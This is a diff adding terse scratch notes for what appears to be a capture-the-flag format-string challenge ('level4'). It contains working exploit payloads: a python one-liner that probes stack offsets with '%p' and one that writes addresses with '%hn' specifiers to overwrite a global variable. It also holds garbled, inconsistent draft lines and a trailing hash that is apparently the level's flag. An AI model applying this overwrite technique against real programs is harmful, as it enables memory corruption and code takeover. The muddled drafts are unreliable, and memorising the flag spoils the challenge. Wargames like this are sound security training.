@@ -1,0 +1,35 @@
+m = 0x 08 45 24 32;
+m = 0x8049810
+m[1] = 0x8049811
+m[2] = 0x8049810
+ 2564 4878;
+
+printf("08452432%2564c$n"08452434%(4878-2564))
+*ADRESS = 2564
+ADRESS
+printf("ADRESS%bytestowrite$n()%bytestowrite(+ 2)")
+
+
+m[0] m[1] m[2] m[3];
+0x0102 5544
+
+08049810
+
+python -c 'print "AAAABBBB" + ".%p" * 20' > /tmp/lvl4
+
+to know which stack arguments corresponds to each indexes
+(search for AAAABBBB in the adresses output)
+
+python -c 'import struct; print struct.pack("<I", 0x8049810) 
+	+ struct.pack("<I", 0x8049812) 
+	+ "%21820c%12$hn" + "%43966c%13$hn"' 
+	> /tmp/lvl4
+
+	put first the 2 adresses to writes to: 
+	- first 2 bytes of global
+	- bytes 3+4 of global
+
+	then put little half of value in m[0]
+	then overflow to put big half in m[2]
+
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
